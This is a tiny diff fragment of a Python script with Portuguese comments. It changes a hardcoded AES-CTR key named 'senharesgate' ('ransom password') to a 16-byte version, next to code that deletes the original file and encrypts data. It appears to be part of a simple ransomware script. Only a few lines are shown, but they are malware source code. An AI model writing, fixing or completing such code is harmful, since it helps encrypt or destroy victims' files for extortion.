@@ -11,7 +11,7 @@ file.close()
 os.remove(file_name)
 
 ## chave de criptografia
-key = b"senharesgate"
+key = b"senharesgate1111"
 aes = pyaes.AESModeOfOperationCTR(key)
 
 ## criptografar o arquivo
